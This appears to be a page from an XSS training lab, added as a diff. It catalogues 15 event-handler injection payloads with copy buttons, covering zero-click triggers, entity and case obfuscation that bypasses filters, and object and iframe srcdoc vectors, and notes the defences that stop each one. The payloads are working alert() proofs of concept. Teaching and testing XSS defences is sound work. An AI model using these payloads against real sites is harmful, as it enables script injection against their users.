@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 02 — Event Handler Injection</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-mechanism{background:#1e3a5f;color:var(--accent)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  .t-origin{background:#1a1500;color:var(--warn)}
+  .t-zeroclick{background:#1a0030;color:var(--purple)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>02 — Event Handler Injection</h1>
+<div class="sub">15 payloads · Mechanism: Event Attributes · Module reference: M05 · Lab endpoint: <code>http://localhost:5000/reflect?q=PAYLOAD</code> and <code>/waf-sim?q=PAYLOAD</code></div>
+
+<div class="section-label">A. Universal Fallback Handlers</div>
+
+<!-- P01 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-origin">UNIVERSAL</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror=alert(document.domain)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — src=x always fails (no file named "x"), guaranteeing onerror fires</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onerror fires when resource fails to load</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that block &lt;script&gt; but pass &lt;img&gt;</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding; CSP without unsafe-inline; attribute sanitizer stripping event handlers</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The most commonly seen XSS proof-of-concept after &lt;script&gt;alert(1)&lt;/script&gt;. Reliable because the onerror event always fires on a broken src.</span>
+  </div>
+</div>
+
+<!-- P02 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-zeroclick">ZERO INTERACTION</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;input autofocus onfocus=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — autofocus triggers onfocus automatically on page load</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onfocus fires when element gains focus; autofocus makes this happen without any user action</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking onerror/onload but not onfocus; script-tag-only filters</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP without unsafe-inline; sanitizer stripping autofocus + event handlers</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Zero-click vector — fires immediately on page load without mouse movement or clicks. Critical for stored XSS scenarios where attacker can't control user interaction.</span>
+  </div>
+</div>
+
+<!-- P03 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-zeroclick">ZERO INTERACTION</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;body onload=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">When attacker controls content that becomes the body element, or in HTML injection contexts that allow body tag</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onload fires when the document finishes loading</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that block img/script but not body element event handlers</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers stripping event attributes on body; contexts where body tag injection is impossible</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Useful when injecting into pages where &lt;body&gt; tag appears later in the document. The first &lt;body&gt; wins in most parsers.</span>
+  </div>
+</div>
+
+<!-- P04 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-zeroclick">ZERO INTERACTION</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;svg onload=alert(1)&gt;&lt;/svg&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — SVG element fires onload when parsed inline</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute on SVG element; fires immediately like body onload</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that block script/img/body but allow SVG tags; "image tag only" event filter</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers stripping event handlers on SVG; blocking SVG in allowed tag list</span>
+    <span class="meta-key">Origin</span><span class="meta-val">SVG is a first-class HTML5 namespace. &lt;svg onload=...&gt; is identical in effect to &lt;body onload=...&gt;. Very widely used in bug bounty reports.</span>
+  </div>
+</div>
+
+<div class="section-label">B. Interaction-Required Handlers (User-Triggered)</div>
+
+<!-- P05 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;div style="position:fixed;inset:0;cursor:pointer" onmousemove=alert(1)&gt;&lt;/div&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — div covers the entire viewport; any mouse movement fires the handler</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onmousemove fires on any cursor movement; full-screen div makes this near-certain</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Bypasses "zero interaction needed" defenses by appearing user-triggered, while being near-guaranteed to fire</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP unsafe-inline off; sanitizers stripping onmousemove; style attribute sanitization</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The Twitter 2010 worm used exactly this technique — full-screen coverage ensures the event fires for any mouse movement.</span>
+  </div>
+</div>
+
+<!-- P06 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;details open ontoggle=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — the open attribute causes details to render expanded; ontoggle fires immediately</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: ontoggle fires when details element opens/closes; open attr makes it fire on parse</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking common event names (onerror, onload, onfocus) but not ontoggle</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; event handler allowlist sanitizers; blocking details/summary in allowed tags</span>
+    <span class="meta-key">Origin</span><span class="meta-val">HTML5 &lt;details&gt; element. The ontoggle event fires when open state changes. Combined with open attribute this is an immediate, zero-click trigger. Popularised in XSS filter bypasses circa 2014.</span>
+  </div>
+</div>
+
+<!-- P07 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;video src=1 onerror=alert(1)&gt;&lt;/video&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — invalid src causes onerror to fire</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onerror on media element fires when media fails to load</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters that block &lt;img&gt; onerror but not &lt;video&gt; onerror</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Sanitizers stripping onerror from all elements; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Same mechanism as img onerror but via the video element. Useful when img is specifically blocked.</span>
+  </div>
+</div>
+
+<!-- P08 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;marquee onstart=alert(1)&gt;text&lt;/marquee&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — marquee is a deprecated element that still fires events in some browsers</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onstart fires when marquee animation begins</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters targeting modern element names but missing deprecated elements</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Modern sanitizers (deprecated elements removed); Chrome removed marquee animation; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Historic IE/Firefox vector. Marquee is still parsed in some browsers but animation behaviour is inconsistent. Represents the "long tail" of legacy elements.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Handler Obfuscation — Bypassing Event Name Filters</div>
+
+<!-- P09 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror&#x3D;alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — the <code>=</code> sign is HTML-entity encoded</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute; HTML entity <code>&amp;#x3D;</code> decodes to <code>=</code> before attribute parsing</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching <code>onerror=</code> (with literal equals sign) before HTML decoding</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Filters/sanitizers that decode HTML entities before pattern matching; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">HTML attribute values allow entity encoding before parsing. The browser decodes <code>&amp;#x3D;</code> to <code>=</code> before evaluating the attribute. Demonstrates why pre-decode checking is mandatory.</span>
+  </div>
+</div>
+
+<!-- P10 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">ENCODING</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x ONERROR=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — attribute name is uppercase</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute (HTML attribute names are case-insensitive)</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters matching only lowercase <code>onerror</code></span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Case-insensitive matching; CSP; output encoding</span>
+    <span class="meta-key">Origin</span><span class="meta-val">The HTML spec requires case-insensitive attribute name handling. Trivially bypasses case-sensitive filters.</span>
+  </div>
+</div>
+
+<!-- P11 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x on&#x65;rror=alert(1)&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — event name contains an HTML entity inside it</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute; HTML entity inside attribute name decoded before parsing</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">String-matching filters that check attribute names as-is without entity decoding</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOM-level sanitizers; entity-decoding filters; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val"><code>&amp;#x65;</code> = <code>e</code>. The browser decodes this in the attribute name, yielding <code>onerror</code>. Demonstrates that filters must decode before checking.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Rare but Valid Event Handlers</div>
+
+<!-- P12 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;X&lt;/button&gt;&lt;/form&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — formaction on button overrides form action; click required</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 — URI scheme (javascript:) via formaction attribute</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking javascript: in href/action but not formaction</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers blocking javascript: URI in all navigable attributes</span>
+    <span class="meta-key">Origin</span><span class="meta-val">formaction is a valid HTML5 attribute on button/input type=submit. It overrides the parent form's action. Allows javascript: URI execution on form submission click.</span>
+  </div>
+</div>
+
+<!-- P13 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-zeroclick">ZERO INTERACTION</span></div>
+    <span class="entry-num">13</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;select autofocus onfocus=alert(1)&gt;&lt;option&gt;x&lt;/option&gt;&lt;/select&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — autofocus works on select elements too</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 — Event attribute: onfocus + autofocus = immediate execution</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters allowing autofocus only on input elements</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers stripping autofocus from non-input elements; removing event handlers</span>
+    <span class="meta-key">Origin</span><span class="meta-val">autofocus works on any focusable element: input, select, textarea, button, a. A filter that only removes autofocus from &lt;input&gt; misses this.</span>
+  </div>
+</div>
+
+<!-- P14 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">14</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;object data="data:text/html,&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;"&gt;&lt;/object&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — object element loads an inline HTML document via data: URI</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">3 + 1 — URI scheme (data:) loads a sub-document containing a script tag</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters blocking script/img/svg but passing object element; filters checking data attribute value only for javascript:</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>object-src 'none'</code>; sanitizers blocking object element; blocking data: URI in object data</span>
+    <span class="meta-key">Origin</span><span class="meta-val">object element loads a sub-document. data:text/html creates an inline HTML document. That document has access to parent.document (same-origin). Reason CSP must include object-src 'none'.</span>
+  </div>
+</div>
+
+<!-- P15 -->
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-mechanism">EVENT ATTR</span><span class="tag t-bypass">FILTER BYPASS</span></div>
+    <span class="entry-num">15</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;iframe srcdoc="&lt;img src=x onerror=alert(parent.domain)&gt;"&gt;&lt;/iframe&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Context</span><span class="meta-val">HTML body — srcdoc creates an inline same-origin iframe document</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">2 + 1 — srcdoc attribute is HTML-entity decoded, then parsed as a sub-document; inner onerror fires</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Filters checking the outer attribute value (sees HTML-encoded img) but not simulating the decoding that srcdoc applies</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP; sanitizers stripping srcdoc or iframe; blocking event handlers in srcdoc content</span>
+    <span class="meta-key">Origin</span><span class="meta-val">srcdoc HTML entities are decoded before the sub-document is parsed. This is one layer of entity decoding on top of normal attribute parsing — a classic mXSS surface (see M13).</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="01_script_tags.html">← 01: Script Tags</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="03_uri_schemes.html">03: URI Schemes →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    btn.textContent = 'copied!';
+    setTimeout(() => btn.textContent = 'copy', 1500);
+  });
+});
+</script>
+
+</body>
+</html>
